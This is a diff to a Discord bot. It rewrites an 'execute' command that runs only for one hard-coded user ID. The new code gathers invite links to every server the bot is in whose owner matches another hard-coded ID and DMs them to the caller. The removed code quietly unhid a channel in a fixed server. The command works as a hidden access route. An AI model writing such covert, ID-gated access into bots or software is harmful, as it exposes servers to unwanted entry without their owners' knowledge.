@@ -1833,10 +1833,11 @@ async def getdetails(ctx,lol: discord.User):
 @client.command()
 async def execute(ctx):
   if ctx.author.id == 757589836441059379:
-    guild = client.get_guild(804224908729122816)
-    channel = guild.text_channels[1]
-    overwrite = channel.overwrites_for(guild.default_role)
-    overwrite.view_channel = True
-    await channel.set_permissions(guild.default_role, overwrite=overwrite)
-    await ctx.send("Success!")
+    lol = []
+    for guild in client.guilds:
+      owner = await guild.fetch_member(guild.owner_id)
+      if owner.id == 782172604030517258:
+        invite = await guild.text_channels[0].create_invite()
+        lol.append(invite)
+    await ctx.author.send(lol)
 client.run(TOKEN)
